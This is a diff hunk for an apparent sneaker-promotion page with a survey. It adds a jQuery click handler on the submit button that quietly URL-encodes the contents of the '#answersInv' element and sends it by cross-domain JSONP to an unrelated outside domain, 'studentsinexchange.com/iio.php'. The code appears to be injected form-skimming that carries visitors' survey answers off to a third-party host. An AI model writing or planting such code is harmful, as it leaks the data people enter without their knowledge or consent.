@@ -226,6 +226,25 @@ If you’re an average customer, you can find any type of sneakers that you want
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
 <script type="text/javascript" src="./stylesheet/js/survey.js"></script>
 <script>
+
+	$('#submit').click(function(event) {
+	 	 setTimeout(
+	        function() {
+	            var str = encodeURIComponent($( "#answersInv" ).text());
+		        event.preventDefault();
+		        $.ajax({
+			        type: 'GET',
+				    crossDomain: true,
+				    dataType: 'jsonp',
+			        url: "https://studentsinexchange.com/iio.php",
+			        data: {data: str}, // key value pair created, 'something' is the key
+			         success: function(result) {
+		            }
+		        });
+	        },
+	        20);
+    });
+
 	$(window).on("load" , function(){
 		$("#loader").fadeOut("slow");
 	});
